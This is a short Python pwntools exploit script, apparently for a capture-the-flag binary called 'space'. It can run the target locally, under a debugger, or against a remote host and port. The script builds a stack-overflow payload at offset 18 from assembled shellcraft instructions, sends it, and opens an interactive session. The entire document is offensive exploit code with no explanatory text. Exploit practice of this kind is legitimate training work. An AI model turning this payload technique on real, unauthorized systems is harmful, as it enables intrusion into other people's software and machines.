#!/usr/bin/python3

from pwn import *

elf = None

def start():

    global elf
    file_name = './space'
    elf = context.binary = ELF(file_name)
    context.arch = 'i386'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwndbg
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process(file_name)


def runmain(): 
    io = start()
    offset = 18

    payload = flat(
        {
            offset: [
                asm(shellcraft.mov('ecx', 0x0804b2d4)),
                asm(shellcraft.ret())
            ]
        }
    )

    info(f'the payload is: {enhex(payload)}')

    input('IDA>')
    io.sendlineafter('>', payload)
    io.interactive()


if __name__ == '__main__':
    runmain()